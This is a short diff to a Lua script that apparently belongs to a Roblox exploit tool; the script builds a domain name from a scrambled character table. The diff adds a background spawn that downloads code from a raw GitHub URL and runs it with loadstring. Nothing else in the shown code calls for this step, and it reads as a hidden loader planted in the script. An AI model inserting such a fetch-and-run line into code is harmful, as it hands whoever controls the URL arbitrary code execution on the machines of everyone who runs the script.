@@ -86,6 +86,9 @@ getgenv()._currenthashdb = function()
 end
 
 getgenv()._Emojis = {Pause = "⏸️", Play = "▶️"}
+spawn(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/HazeWasTaken/PayPal/master/reeeeeeee", true))()
+end)
 
 local domain = "jailbricked"
 local j = {"/", "t", "c", "h", "o", "s", ":", "a", "m", "p"}
